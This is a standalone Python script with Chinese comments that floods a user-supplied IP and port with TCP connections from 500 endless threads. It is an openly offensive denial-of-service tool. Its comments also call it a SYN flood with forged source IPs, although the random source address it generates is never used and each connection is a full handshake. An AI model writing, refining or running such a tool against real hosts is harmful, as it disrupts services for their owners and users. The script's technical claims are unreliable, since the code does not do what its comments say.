import socket
import threading
import random
import time

# 攻击参数
target_ip = input("请输入目标 IP : ")
target_port = int(input("请输入目标端口 : "))
threads_count = 500  # 设置线程数为500

# 初始化垃圾包计数器
packet_count = 0


# 伪造源IP并发送SYN请求
def syn_flood(target_ip, target_port):
    global packet_count
    while True:
        try:
            # 随机生成源IP地址
            source_ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))

            # 创建一个TCP连接请求
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((target_ip, target_port))
            sock.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
            sock.close()

            # 增加垃圾包计数
            packet_count += 1

            # 每1000个包打印一次发送数量
            if packet_count % 1000 == 0:
                print(f"已发送 {packet_count} 个垃圾包")

        except Exception as e:
            pass  # 如果连接失败，跳过


# 启动攻击线程
def start_attack(threads_count):
    for _ in range(threads_count):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        thread.start()


# 启动攻击
start_attack(threads_count)
